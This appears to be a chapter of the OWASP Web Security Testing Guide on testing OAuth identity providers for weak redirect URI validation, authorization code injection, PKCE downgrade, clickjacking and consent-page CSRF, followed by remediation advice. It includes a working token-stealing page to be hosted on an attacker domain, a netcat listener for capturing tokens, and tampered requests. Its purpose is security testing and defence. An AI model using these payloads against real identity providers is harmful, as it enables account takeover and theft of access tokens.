# Testing OAuth IdP Weaknesses

|ID            |
|--------------|
|WSTG-ATHZ-05.1|

## Summary

OAuth stores the identities of users and the correspondent access rights at the IdP (Identity Provider). The IdP does play a crucial role during the OAuth flow as it grants access to clients. To be able to do that it must properly validate parameters which are part of the OAuth flows.

Failure to validate the parameters may lead to  account takeover, unauthorized resource access and the elevation of privileges.

## Test Objectives

- Retrieve credentials used for authorization
- Grant yourself access to arbitrary resources trough forceful browsing
- Bypass the authorization

## How to test

### Testing for insufficient Redirect URI Validation

The OAuth flow makes use of a `redirect_uri` in the authorization request. If this uri is not properly validated a link can be crafted that contains a attacker controlled URL, `client.evil.com` in this example.

- `
https://idp.example.com/auth/realms/example/protocol/openid-connect/auth?client_id=app-angular2&redirect_uri=http%3A%2F%client.evil.com%2Fapp-angular2%2F&state=19abbae7-79cb-4e82-8ea1-897d98251f4e&response_mode=fragment&response_type=code&scope=openid&nonce=636db683-18ba-4c92-a56f-a7f7ccd772ce HTTP/1.1
`

If a user opens the link in the user-agent, the IdP will redirect the user agent to the spoofed URL.
The attacker can host a script on the spoofed URL that captures the `code` value and submits it back to the IdP's token endpoint.  

This can be archived with the following sample code hosted at the attacker controlled server.
Note: This JavaScript is compatible with Keycloak IdPs, other IdPs may need tweaking of the requests.
Furthermore the attack will fail when the IdP has CORS configured and blocks cross-origin requests.

If CORS is configured a setup involving server side technologies such as a python app, that allow the spoofing of the origin header, are required.

```JavaScript
<html>
    <body>
    <head>
        <title>OAuth open redirects</title>
    </head>
<h3>OAuth code: </h3>

<p id="code"></p>

<script>

    var hash = location.hash.substring(1);

    var result = hash.split('&').reduce(function (res, item) {
    var parts = item.split('=');
    res[parts[0]] = parts[1];
    return res;
    }, {});

    var code = result.code
    document.getElementById("code").innerHTML = "The code got phished: " + code;

    function submitStep1()
       {
        var step1 = new XMLHttpRequest();
        step1.open("GET", "http:\/\/idp.example.com\/auth\/realms\/example\/protocol\/openid-connect\/3p-cookies\/step1.html", true);
        step1.setRequestHeader("Accept", "*\/*");
        step1.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        step1.send(new Blob([aBody]));
       }


    function submitStep2()
       {
        var step2 = new XMLHttpRequest();
        step2.open("GET", "http:\/\/idp.example.com\/auth\/realms\/example\/protocol\/openid-connect\/3p-cookies\/step2.html", true);
        step2.setRequestHeader("Accept", "*\/*");
        step2.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
        var body = "";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        step2.send(new Blob([aBody]));
       }
    submitStep1();
    submitStep2();


    function submitRequest()
       {
         var xhr = new XMLHttpRequest();
         xhr.open("POST", "https:\/\/idp.example.com\/auth\/realms\/example\/protocol\/openid-connect\/token", true);
         xhr.setRequestHeader("Content-type", "application\/x-www-form-urlencoded");
         xhr.setRequestHeader("Accept", "*\/*");
         xhr.setRequestHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");
         xhr.withCredentials = true;
         var body = "code=" + code + "&grant_type=authorization_code&client_id=app-angular2&redirect_uri=http%3A%2F%2Fclient.evil.com%2Fapp-angular2%2F";
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i);
         xhr.send(new Blob([aBody]));
       }
    </script>

    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
    </body>
</html>
```

On the attacker server open a netcat listener to capture the response with the access token

```bash
nc -l -p 443
```

When the IdP validates the `code` the attacker can capture the `access_token` and `refresh_token` and therefore retrieves all rights that are assigned to the `access_token`.

### Authorization Code Injection

During the Authorization Code flow's code exchange a code is issued by the authorization server to the client
and later exchanged against the token endpoint to retrieve authorization and refresh token.

Conduct the following tests against the authorization server:

- send a valid code for another client_id
- send a valid code for another redirect_uri
- resend the code (code replay)

The request which is send towards the token endpoint contains the code as it is exchanged against the token.
Capture this request with a proxy tool like OWASP ZAP and resend the request with the tampered values.

```http
POST /auth/realms/example/protocol/openid-connect/token HTTP/1.1
Host: idp.example.com
[...]
code=26a07de1-3a69-4f8d-b131-5e3b57538ad0.15133397-373d-4526-8230-c29db9291cfb.622460b9-0522-4251-b300-1d2e71c89e41&grant_type=authorization_code&client_id=app-angular2&redirect_uri=http%3A%2F%client.example.com%2Fapp-angular2%2F
```

### PKCE Downgrade Attack

Under certain circumstances the PKCE extension can be removed from the authorization code flow. This has the potential to leave public clients vulnerable to attacks mitigated by the PKCE extension.

- The authorization server does not support PKCE
- The authorization server does not properly validate PKCE

Both can be tested with a proxy tool like OWASP ZAP. An attacker may start the OAuth flow and remove  the `code_challenge=sha256(xyz)` and `code_challenge_method` parameter from the request.

**Original Request:**

```http
GET /authorize?redirect_uri=http%3A%2F%client.example.com&client_id=ZXhhbXBsZQ%3d%3d&errorPath=%2Ferror&scope=openid%20profile%20email&response_type=code&response_mode=web_message&state=ZXhhbXBsZQ%3d%3d&nonce=ZFMybmVFQlQ2fkgxUm1EWGJFS2hhQV83SVBNTVN0MkEtYWlnWUZuS1dlNA%3D%3D&code_challenge=Vgn0iTdmqaLcXzAa_UXRRvcpNSqHgGStkZv-h4kdZqs&code_challenge_method=S256&prompt=none HTTP/2
Host: idp.example.com
[...]
```

**Modified Request:**

```http
GET /authorize?redirect_uri=http%3A%2F%client.example.com&client_id=ZXhhbXBsZQ%3d%3d&errorPath=%2Ferror&scope=openid%20profile%20email&response_type=code&response_mode=web_message&state=ZXhhbXBsZQ%3d%3d&nonce=ZFMybmVFQlQ2fkgxUm1EWGJFS2hhQV83SVBNTVN0MkEtYWlnWUZuS1dlNA%3D%3D&prompt=none HTTP/2
Host: idp.example.com
[...]
```

### Clickjacking

When the consent page is prone to clickjacking and the attacker is in possession of the client_id (for public clients) and additionally the client secret for confidential client, the attacker can forge the users consent and gain access to the requested scopes throug a rogue client.

For this attack to be successful the attacker needs to load the authorization page in an iframe.
When the authorization page is loaded in the iframe the site is vulnerable to clickjacking.

Load the authorization page in an iframe:

```html
<html>
    <head>
        <title>Clickjack test page</title>
    </head>
    <body>
        <iframe src="http://idp.example.com/auth/realms/example/login-actions/required-action?execution=OAUTH_GRANT&client_id=app-angular2&tab_id=GicGYXuwFTg" width="500" height="500"></iframe>
    </body>
</html>
```

See [Testing for Clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md) for a detailed description of how such an attack can be conducted.

### Cross Site Request Forgery

CSRF attacks are described in [CSRF](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md) there are few targets in OAuth that can be attacked with CSRF.

To prevent CSRF attacks OAuth leverages the `state` parameter as an anti CSRF token.

Other measures can prevent CSRF Attacks as well. The PKCE flow is a mitigation against CSRF. A `nonce` value may act as an anti CSRF token as well.

Targets:

- Consent Page

#### Consent Page

The consent page is displayed to a user to verify that this user consents in the client accessing the resource on the users behalf. Attacking the consent page with a CSRF might grant an arbitrary client access to a resource on behalf of the user.

1. Client generates a state parameter and sends it with the consent request.
2. User Agent displays the consent page
3. Resource Owner grant's access to the client
4. The consent is sent to the IdP together with the acknowledged scopes

Use a tool like OWASP ZAP to test if the state parameter is properly validated.

```http
POST /u/consent?state=Tampered_State HTTP/2
Host: idp.example.com
[...]

state=Tampered_State&audience=https%3A%2F%2Fidp.example.com%2Fuserinfo&scope%5B%5D=profile&scope%5B%5D=email&action=accept
```

### Refresh Token Protection

- Use only once

## Related Test Cases

- [Testing for Cross Site Request Forgery](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)
- [Testing for Client-side URL Redirect](../11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md)
- [Testing JSON Web Tokens](../06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)
- [Testing for Clickjacking](../11-Client-side_Testing/09-Testing_for_Clickjacking.md)
- [Testing Cross Origin Resource Sharing](../11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md)

## Remediation

Most of the attacks against OAuth IdPs can be mitigated by validating the existence and content of parameters during the code and token exchange.

Restricting the time span and allowed usage for credentials like authorization code and refresh token successfully thwarts some attacks and limits the use of such credentials for an attacker.

Proper configuration of security mitigation's like CORS, anti CSRF token and anti-clickjacking headers can limit the impact of attacks, makes them harder to accomplish and for some completely mitigates them.

- Always validate if all parameters are present and their values. 
- Do not allow fallback for security features like the PKCE extension.
- Restrict the lifetime of credentials
- Use credentials only once where possible e.G the authorization code
- Configure available security mitigation like CORS, anti CSRF token and anti Clickjacking headers.

## Tools

- [BurpSuite](https://portswigger.net/burp/releases)
  - [EsPReSSO](https://github.com/portswigger/espresso)
- [OWASP ZAP](https://www.zaproxy.org/)

## References

- [User Authentication with OAuth 2.0](https://oauth.net/articles/authentication/)
- [The OAuth 2.0 Authorization Framework](https://datatracker.ietf.org/doc/html/rfc6749)
- [The OAuth 2.0 Authorization Framework: Bearer Token Usage](https://datatracker.ietf.org/doc/html/rfc6750)
- [OAuth 2.0 Threat Model and Security Considerations](https://datatracker.ietf.org/doc/html/rfc6819)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-16)
- [Authorization Code Flow with Proof Key for Code Exchange](https://auth0.com/docs/authorization/flows/authorization-code-flow-with-proof-key-for-code-exchange-pkce)
